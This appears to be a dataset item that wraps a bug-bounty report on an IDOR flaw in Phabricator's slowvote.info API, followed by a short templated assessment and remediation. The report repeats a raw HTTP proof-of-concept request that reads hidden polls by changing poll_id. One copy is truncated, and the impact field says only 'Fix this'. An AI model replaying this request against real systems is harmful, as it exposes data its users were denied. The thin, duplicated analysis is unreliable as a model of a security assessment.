# ACCESS_CONTROL — h1

- source: h1
- class: access_control
- cwe: CWE-639
- severity: informational
- program: phabricator
- quality_score: 11

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** IDOR bug to See hidden slowvote of any user even when you dont have access right

**Vulnerability Description:**
USER ACCOUNT
=============
1. user A (who create slowvote)
2. User B (Dont have permissioon to see above slowvote)
3. User C (has permission to see above slowvote)

STEP TO REPRODUCE
==================
1. From user A account goto http://phabricator.localhost.com/vote/create/ and create a slowvote .
   Change this slowvote "Visible To" to "No one" or to user C .
  Slowvote url will be now like http://phabricator.localhost.com/V1 .

2. Now user B visit above slowvote url http://phabricator.localhost.com/V1 and see that he dont have access permission .
Now user B sent bellow request and can see any hidden slowvote 

```
POST /api/slowvote.info HTTP/1.1
Host: phabricator.localhost.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Connection: close
Cookie: [REDACTED_COOKIE]; phusr=admin
Upgrade-Insecure-Requests: 1

__csrf__=B%40wmnrkyq3468c[REDACTED_PHONE]c&__form__=1&params%5Bpoll_id%5D=1&output=human
```
here just change poll_id parameter value to your target poll id and see that hidden poll

## Impact

Fix this

**Steps to Reproduce:**
==================
1. From user A account goto http://phabricator.localhost.com/vote/create/ and create a slowvote .
   Change this slowvote "Visible To" to "No one" or to user C .
  Slowvote url will be now like http://phabricator.localhost.com/V1 .

2. Now user B visit above slowvote url http://phabricator.localhost.com/V1 and see that he dont have access permission .
Now user B sent bellow request and can see any hidden slowvote 

```
POST /api/slowvote.info HTTP/1.1
Host: phabricator.localhost.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Connection: close
Cookie: [REDACTED_COOKIE]; phusr=admin
Upgrade-Insecure-Requests: 1

__csrf__=B%40wmnrkyq3468c[REDACTED_PHONE]c&__form__=1&params%5Bpoll_id%5D=1&output=human
```
here just change poll_id parameter value to your target poll id and see that hidden poll

**Proof of Concept:**
```
POST /api/slowvote.info HTTP/1.1
Host: phabricator.localhost.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Connection: close
Cookie: [REDACT

## Analysis / Response

**Vulnerability Class:** access_control
**CWE:** CWE-639
**Weakness:** Insecure Direct Object Reference (IDOR)
**Severity:** informational
**Endpoint Pattern:** POST /api/slowvote.info

**Impact Assessment:**
Fix this

**Remediation:**
Implement server-side authorization checks on every request. Use role-based access control. Deny by default. Never rely on client-side access control.
